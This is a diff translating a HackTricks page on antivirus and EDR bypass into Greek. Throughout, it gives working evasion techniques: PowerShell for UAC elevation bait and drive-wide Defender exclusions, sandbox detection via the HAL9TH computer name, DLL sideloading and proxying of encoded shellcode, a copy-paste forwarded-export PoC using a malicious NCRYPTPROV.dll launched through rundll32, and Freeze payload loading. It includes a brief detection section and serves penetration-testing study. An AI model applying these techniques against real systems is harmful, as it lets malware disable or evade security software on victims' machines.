@@ -1,32 +1,32 @@
-# Antivirus (AV) Bypass
+# Παράκαμψη Antivirus (AV)
 
 {{#include ../banners/hacktricks-training.md}}
 
 **Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
-## Stop Defender
+## Διακοπή του Defender
 
-- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί.
-- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί, προσποιούμενο άλλο AV.
-- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
+- [defendnot](https://github.com/es3n1n/defendnot): Ένα tool για τη διακοπή λειτουργίας του Windows Defender.
+- [no-defender](https://github.com/es3n1n/no-defender): Ένα tool για τη διακοπή λειτουργίας του Windows Defender, προσποιούμενο ότι υπάρχει άλλο AV.
+- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)
 
-### Installer-style UAC bait before tampering with Defender
+### Installer-style UAC bait πριν από την παραποίηση του Defender
 
-Public loaders που μεταμφιέζονται σε game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers που πρώτα **ζητούν από τον χρήστη elevation** και μόνο μετά αδρανοποιούν το Defender. Η ροή είναι απλή:
+Οι public loaders που μεταμφιέζονται ως game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι πρώτα **ζητούν από τον χρήστη elevation** και μόνο μετά εξουδετερώνουν το Defender. Η ροή είναι απλή:
 
-1. Ελέγξτε για administrative context με `net session`. Η εντολή πετυχαίνει μόνο όταν ο καλών έχει admin rights, οπότε μια αποτυχία δείχνει ότι ο loader εκτελείται ως standard user.
-2. Αμέσως εκκινεί ξανά τον εαυτό του με το `RunAs` verb για να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας το αρχικό command line.
+1. Ελέγχει αν υπάρχει administrative context με το `net session`. Η εντολή ολοκληρώνεται με επιτυχία μόνο όταν ο caller έχει δικαιώματα admin, επομένως η αποτυχία δείχνει ότι ο loader εκτελείται ως standard user.
+2. Κάνει αμέσως relaunch τον εαυτό του με το verb `RunAs`, ώστε να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
 ```powershell
 if (-not (net session 2>$null)) {
 powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
 exit
 }
 ```
-Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” λογισμικό, οπότε το prompt συνήθως γίνεται αποδεκτό, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.
+Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» software, οπότε η προτροπή συνήθως γίνεται αποδεκτή, παρέχοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.
 
-### Blanket `MpPreference` exclusions for every drive letter
+### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου
 
-Μόλις αποκτήσει elevated δικαιώματα, τα GachiLoader-style chains μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιούν εντελώς την υπηρεσία. Το loader πρώτα σκοτώνει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και μετά εφαρμόζει **extremely broad exclusions** ώστε κάθε user profile, system directory και removable disk να γίνεται unscannable:
+Μόλις αποκτήσουν elevated δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιήσουν εξ ολοκλήρου την υπηρεσία. Αρχικά, ο loader τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε κάθε user profile, system directory και removable disk να μην μπορεί να σαρωθεί:
 ```powershell
 $targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
 Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
@@ -35,92 +35,92 @@ Add-MpPreference -ExclusionExtension '.sys'
 ```
 Key observations:
 
-- Ο βρόχος περνά από κάθε mounted filesystem (D:\, E:\, USB sticks, etc.) οπότε **οποιοδήποτε future payload dropped οπουδήποτε στο disk αγνοείται**.
-- Το `.sys` extension exclusion είναι forward-looking—οι attackers κρατούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να αγγίξουν το Defender ξανά.
-- Όλες οι αλλαγές καταλήγουν κάτω από `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε later stages να επιβεβαιώσουν ότι τα exclusions επιμένουν ή να τα επεκτείνουν χωρίς να ξαναενεργοποιήσουν UAC.
+- Ο βρόχος διατρέχει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload τοποθετηθεί οπουδήποτε στον δίσκο αγνοείται**.
+- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα, χωρίς να χρειαστεί να αγγίξουν ξανά το Defender.
+- Όλες οι αλλαγές καταγράφονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα stages να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.
 
-Επειδή δεν σταματά κανένα Defender service, τα naïve health checks συνεχίζουν να αναφέρουν “antivirus active” παρότι το real-time inspection δεν αγγίζει ποτέ εκείνα τα paths.
+Καθώς καμία υπηρεσία του Defender δεν σταματά, οι απλοϊκοί health checks συνεχίζουν να αναφέρουν “antivirus active”, παρόλο που η real-time επιθεώρηση δεν ελέγχει ποτέ αυτές τις διαδρομές.
 
 ## **AV Evasion Methodology**
 
-Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.
+Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι malicious ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDRs, behavioural analysis.
 
 ### **Static detection**
 
-Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:
+Το Static detection επιτυγχάνεται με την επισήμανση γνωστών malicious strings ή arrays από bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σας κάνει detect ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτού του είδους το detection:
 
 - **Encryption**
 
-If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.
+Αν κάνετε encrypt το binary, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιου είδους loader για να κάνει decrypt και να εκτελέσει το πρόγραμμα στη μνήμη.
 
 - **Obfuscation**
 
-Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.
+Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε ορισμένα strings στο binary ή το script σας, ώστε να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.
 
 - **Custom tooling**
 
-If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.
+Αν αναπτύξετε τα δικά σας tools, δεν θα υπάρχουν γνωστά bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.
 
 > [!TIP]
-> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
+> Ένας καλός τρόπος για να ελέγξετε το Windows Defender static detection είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλά segments και ζητά από το Defender να σκανάρει το καθένα ξεχωριστά. Με αυτόν τον τρόπο, μπορεί να σας δείξει ακριβώς ποια strings ή bytes στο binary σας έχουν επισημανθεί.
 
-I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.
+Συνιστώ ιδιαίτερα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το practical AV Evasion.
 
 ### **Dynamic analysis**
 
-Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.
+Το Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των passwords του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά υπάρχουν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.
 
-- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
-- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
-- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.
+- **Sleep before execution** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του AV dynamic analysis. Τα AVs έχουν πολύ λίγο χρόνο για να σκανάρουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως τα μεγάλα sleeps μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν το sleep, ανάλογα με τον τρόπο υλοποίησής του.
+- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ περιορισμένους πόρους στη διάθεσή τους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το machine του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
+- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου το workstation είναι joined στο domain "contoso.local", μπορείτε να κάνετε έναν έλεγχο στο domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει. Αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμά σας exit.
 
-It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.
+Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH. Έτσι, μπορείτε να ελέγξετε το computer name στο malware σας πριν από το detonation. Αν το όνομα είναι HAL9TH, αυτό σημαίνει ότι βρίσκεστε μέσα στο defender's sandbox, επομένως μπορείτε να κάνετε το πρόγραμμά σας exit.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes
+Μερικά ακόμη πολύ καλά tips από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
 
-As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:
+Όπως αναφέραμε και προηγουμένως σε αυτό το post, τα **public tools** τελικά θα **ανιχνευθούν**, επομένως πρέπει να αναρωτηθείτε το εξής:
 
-For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.
+Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεστε πραγματικά το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS;
 
-The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.
+Η σωστή απάντηση πιθανότατα είναι η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα — αν όχι το πιο — flagged pieces of malware από τα AVs και EDRs. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AVs. Επομένως, απλώς αναζητήστε alternatives για αυτό που προσπαθείτε να πετύχετε.
 
 > [!TIP]
-> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.
+> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι έχετε **απενεργοποιήσει το automatic sample submission** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε το automatic sample submission και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.
 
 ## EXEs vs DLLs
 
-Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).
+Όποτε είναι δυνατό, να **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **ανιχνεύονται και αναλύονται πολύ λιγότερο**, επομένως είναι ένα πολύ απλό trick για την αποφυγή του detection σε ορισμένες περιπτώσεις (αν φυσικά το payload σας μπορεί να εκτελεστεί ως DLL).
 
-As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.
+Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.
 
 <figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
 
-Now we'll show some tricks you can use with DLL files to be much more stealthier.
+Τώρα θα δείξουμε μερικά tricks που μπορείτε να χρησιμοποιήσετε με DLL files, ώστε να γίνετε πολύ πιο stealthy.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.
+Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας τόσο την victim application όσο και τα malicious payload(s) το ένα δίπλα στο άλλο.
 
-You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
+Μπορείτε να ελέγξετε για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
 ```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL files που προσπαθούν να φορτώσουν.
+Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.
 
-Σου προτείνω πολύ να **εξερευνήσεις μόνος/η σου DLL Hijackable/Sideloadable programs**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσεις publicly known DLL Sideloadable programs, μπορεί να σε πιάσουν εύκολα.
+Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημοσίως γνωστά DLL Sideloadable προγράμματα, μπορεί να εντοπιστείτε εύκολα.
 
-Μόνο με το να τοποθετήσεις ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σου, γιατί το πρόγραμμα περιμένει ορισμένες συγκεκριμένες functions μέσα σε αυτό το DLL, για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.
+Απλώς τοποθετώντας ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, το payload σας δεν θα φορτωθεί, καθώς το πρόγραμμα αναμένει ορισμένες συγκεκριμένες functions μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.
 
-Το **DLL Proxying** προωθεί τις calls που κάνει ένα πρόγραμμα από το proxy (and malicious) DLL προς το original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας να χειριστούμε την εκτέλεση του payload σου.
+Το **DLL Proxying** προωθεί τις κλήσεις που πραγματοποιεί ένα πρόγραμμα από το proxy (και malicious) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.
 
-Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)
+Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik)
 
 Αυτά είναι τα βήματα που ακολούθησα:
 ```
@@ -129,7 +129,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.
+Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
@@ -139,38 +139,38 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Τόσο το shellcode μας (encoded με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το έλεγα επιτυχία.
+Τόσο το shellcode μας (encoded με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Συστήνω **πολύ έντονα** να δείτε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) σχετικά με DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε σε μεγαλύτερο βάθος.
+> Σου **συνιστώ ανεπιφύλακτα** να παρακολουθήσεις το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [video του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθεις περισσότερα και σε μεγαλύτερο βάθος σχετικά με όσα συζητήσαμε.
 
 ### Abusing Forwarded Exports (ForwardSideLoading)
 
-Τα Windows PE modules μπορούν να export functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνει σε code, η export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, το Windows loader θα:
+Τα Windows PE modules μπορούν να κάνουν export functions που είναι στην πραγματικότητα "forwarders": αντί να δείχνει σε κώδικα, το export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, ο Windows loader:
 
-- Load το `TargetDll` αν δεν είναι ήδη loaded
-- Resolve το `TargetFunc` από αυτό
+- Κάνει load το `TargetDll`, αν δεν έχει ήδη φορτωθεί
+- Κάνει resolve το `TargetFunc` από αυτό
 
-Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
-- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο KnownDLLs namespace (π.χ. ntdll, kernelbase, ole32).
-- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, που περιλαμβάνει το directory του module που κάνει το forward resolution.
+Βασικές συμπεριφορές που πρέπει να κατανοήσεις:
+- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).
+- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, η οποία περιλαμβάνει τον κατάλογο του module που εκτελεί το forward resolution.
 
-Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που exportάρει μια function forwarded σε ένα non-KnownDLL module name, και μετά τοποθετήστε μαζί με αυτό το signed DLL ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σας από το ίδιο directory, εκτελώντας το DllMain σας.
+Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρες ένα signed DLL που κάνει export μια function forwarded σε ένα non-KnownDLL module name και τοποθέτησε αυτό το signed DLL στον ίδιο κατάλογο με ένα attacker-controlled DLL που έχει ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σου από τον ίδιο κατάλογο, εκτελώντας το `DllMain` σου.
 
-Παράδειγμα που παρατηρήθηκε στο Windows 11:
+Παράδειγμα που παρατηρήθηκε στα Windows 11:
 ```
 keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
 ```
-`NCRYPTPROV.dll` δεν είναι ένα KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.
+`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.
 
 PoC (copy-paste):
-1) Αντιγράψτε το signed system DLL σε έναν writable φάκελο
+1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγγράψιμο φάκελο
 ```
 copy C:\Windows\System32\keyiso.dll C:\test\
 ```
-2) Ρίξε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain είναι αρκετό για να πετύχεις code execution; δεν χρειάζεται να υλοποιήσεις τη forwarded function για να ενεργοποιηθεί το DllMain.
+2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
 ```c
 // x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
 #include <windows.h>
@@ -182,33 +182,33 @@ if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&
 return TRUE;
 }
 ```
-3) Ενεργοποίησε το forward με ένα signed LOLBin:
+3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
 ```
 rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
 ```
 Observed behavior:
-- rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
+- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
 - Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
-- Ο loader στη συνέχεια φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
-- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα πάρεις σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί
+- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain`
+- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`
 
 Hunting tips:
-- Εστίασε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
-- Μπορείς να απαριθμήσεις forwarded exports με εργαλεία όπως:
+- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται κάτω από το `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
+- Μπορείτε να κάνετε enumerate τα forwarded exports με εργαλεία όπως:
 ```
 dumpbin /exports C:\Windows\System32\keyiso.dll
 # forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
 ```
-- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψηφίους: https://hexacorn.com/d/apis_fwd.txt
+- Δείτε το inventory των Windows 11 forwarders για να αναζητήσετε υποψήφιες περιπτώσεις: https://hexacorn.com/d/apis_fwd.txt
 
-Detection/defense ιδέες:
-- Παρακολουθήστε LOLBins (π.χ. rundll32.exe) να φορτώνουν signed DLLs από non-system paths, ακολουθούμενα από φόρτωση non-KnownDLLs με το ίδιο base name από εκείνο το directory
-- Alert σε process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` κάτω από user-writable paths
-- Εφαρμόστε code integrity policies (WDAC/AppLocker) και αρνηθείτε write+execute σε application directories
+Ιδέες για Detection/defense:
+- Παρακολουθήστε τα LOLBins (π.χ. `rundll32.exe`) που φορτώνουν signed DLLs από non-system paths και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
+- Δημιουργήστε alert για process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
+- Επιβάλετε code integrity policies (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
+`Το Freeze είναι ένα payload toolkit για την παράκαμψη των EDRs με χρήση suspended processes, direct syscalls και alternative execution methods`
 
 Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
 ```
@@ -220,24 +220,24 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Το Evasion είναι απλώς ένα cat & mouse game, ό,τι δουλεύει σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεσαι ποτέ μόνο σε ένα tool· αν είναι δυνατόν, προσπάθησε να αλυσιδώσεις πολλαπλές evasion techniques.
